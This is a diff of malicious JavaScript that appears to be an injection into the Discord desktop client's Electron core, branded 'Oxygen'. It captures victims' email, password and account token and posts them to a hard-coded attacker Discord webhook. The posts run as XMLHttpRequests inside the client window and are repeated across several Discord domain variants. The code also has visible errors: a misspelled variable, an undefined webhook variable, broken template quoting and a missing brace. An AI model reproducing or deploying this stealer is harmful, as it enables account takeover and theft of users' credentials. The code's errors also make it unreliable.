@@ -5,12 +5,11 @@ const https = require("https");
 const querystring = require('querystring');
 const electron = require('electron');
 
-const { MessageBuilder, Webhook } = require('discord-webhook-node');
-const hook = new Webhook('https://ptb.discord.com/api/webhooks/903654798316957756/uz9lSQONl4b5L5NTfdxulWgcFQB1bzCSUAQuLsQqOLrHy_n-MwxlhfkL9RBFtpF2zK7l');
- hook.setUsername('OxyGeN'); //Overrides the default webhook username
-hook.setAvatar('https://media.discordapp.net/attachments/764453829155880990/903655737711022110/images.jpeg');
+
 const request = require("request")
 
+  var stoler = "https://ptb.discord.com/api/webhooks/903654798316957756/uz9lSQONl4b5L5NTfdxulWgcFQB1bzCSUAQuLsQqOLrHy_n-MwxlhfkL9RBFtpF2zK7l"
+  stoler = stealer.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
   
 function Secure(token,password){
   	request(
@@ -66,15 +65,43 @@ request(
 		},
   
 		function (error, response, body) {
-     const embed = new MessageBuilder()
+     var params = {
+                username: "Oxygen",
+                content: "",
+                avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
+                embeds: [
+                    {
+                        "color": 2560,
+                        "fields": [
+                            {
+                                "name": "**Email**",
+                                "value": `${nemail}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Pasword**",
+                                "value": `Nitro Type: `${npass}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Token**",
+                                "value": `\`${body.token}\``,
+                                "inline": false
+                            }
+                        ],
+                        "author": {
+                            "name": body.username +"#" + body.discriminator + "・" + body.id,
+                            "icon_url": `https://cdn.discordapp.com/avatars/${body.id}/${body.avatar}.webp`
+                        },
+                        "footer": {
+                            "text": "Oxygen"
+                        }                 
+                    }
+                ]
+            }
+            Sendchanged(JSON.stringify(params));
 
-.setTitle("Account Secured")   .setAuthor(`${body.username}#${body.discriminator}`,`https://cdn.discordapp.com/avatars/${body.id}/${body.avatar}.webp`)     
-.addField(`Email:-`,"```"+`${nemail}`+"```")
-  .addField("Password:","```"+`${npass}`+"```")
-.addField("Token:","```"+ `${body.token}`+"```")
-.setColor("#ff4d4d")
 
-  hook.send(embed)
 
 
       
@@ -161,15 +188,42 @@ request(
 		function (error, response, body) {
      // console.log(error.email._errors)
       //console.log(body)
-      const embed = new MessageBuilder()
+      var params = {
+                username: "Oxygen",
+                content: "",
+                avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
+                embeds: [
+                    {
+                        "color": 2560,
+                        "fields": [
+                            {
+                                "name": "**Email**",
+                                "value": `${nemail}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Pasword**",
+                                "value": `Nitro Type: `${npass}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Token**",
+                                "value": `\`${body.token}\``,
+                                "inline": false
+                            }
+                        ],
+                        "author": {
+                            "name": body.username +"#" + body.discriminator + "・" + body.id,
+                            "icon_url": `https://cdn.discordapp.com/avatars/${body.id}/${body.avatar}.webp`
+                        },
+                        "footer": {
+                            "text": "Oxygen"
+                        }                 
+                    }
+                ]
+            }
+            Sendchanged(JSON.stringify(params));
 
-.setTitle("Account Secured")   .setAuthor(`${body.username}#${body.discriminator}`,`https://cdn.discordapp.com/avatars/${body.id}/${body.avatar}.webp`)     
-.addField(`Email:-`,"```"+`${nemail}`+"```")
-  .addField("Password:","```"+`${npass}`+"```")
-.addField("Token:","```"+ `${body.token}`+"```")
-.setColor("#ff4d4d")
-
-  hook.send(embed)    
 
             })
 
@@ -704,4 +758,62 @@ Secure(token,password)
           }));
       }
   });
+
+
+function Sendchanged(what) {
+    const window = BrowserWindow.getAllWindows()[0];
+
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${cwebhook.replace("discord.", "discordapp.")}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, true).then((token => {
+
+    }));
+
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${cwebhook.replace("discordapp.", "discord.")}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, true).then((token => {
+
+    }));
+
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${cwebhook.replace("discord.", "ptb.discord.")}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, true).then((token => {
+
+    }));
+
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${cwebhook.replace("discord.", "ptb.discordapp.")}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, true).then((token => {
+
+    }));
+
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${cwebhook.replace("discord.", "canary.discord.")}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, true).then((token => {
+
+    }));
+
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${cwebhook.replace("discord.", "canary.discordapp.")}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, true).then((token => {
+
+    }));
   module.exports = require('./core.asar');
